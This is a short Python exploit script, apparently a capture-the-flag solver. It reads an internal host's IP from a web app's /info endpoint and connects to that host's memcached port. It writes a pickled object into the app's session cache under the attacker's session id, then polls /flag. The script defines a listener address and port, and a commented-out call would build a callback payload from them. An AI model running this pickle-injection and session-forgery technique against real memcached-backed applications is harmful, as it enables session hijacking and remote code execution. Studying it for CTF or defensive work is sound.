#!/usr/bin/env python3

import requests
from pwn import *
from solver_pieces import get_payload
import time
import pickle

HOST, PORT = 'localhost', 15961
LHOST, LPORT = '143.248.235.34', 65432

s = requests.Session()
info = s.get(f'http://{HOST}:{PORT}/info').json()
albireo_ip = info['network']['trino']['albireo'][0]

s2 = requests.Session()
s2.get(f'http://{HOST}:{PORT}/')
print(s2.cookies['session'])
sess = s2.cookies['session'].split('.')[0]

p = remote(albireo_ip, 11211)

payload = pickle.dumps({'_permanent': True, 'flag': 'albireo'}) #get_payload(LHOST, LPORT)

p.send(b'ms s:' + sess.encode('ascii') + b' ' + str(len(payload)).encode('ascii') + b'\r\n' + payload + b'\r\n')
p.recv(2)
p.close()

print('payload written!')

for i in range(100):
    input(f'Try #{i}> ')
    print(s2.get(f'http://{HOST}:{PORT}/flag').json())
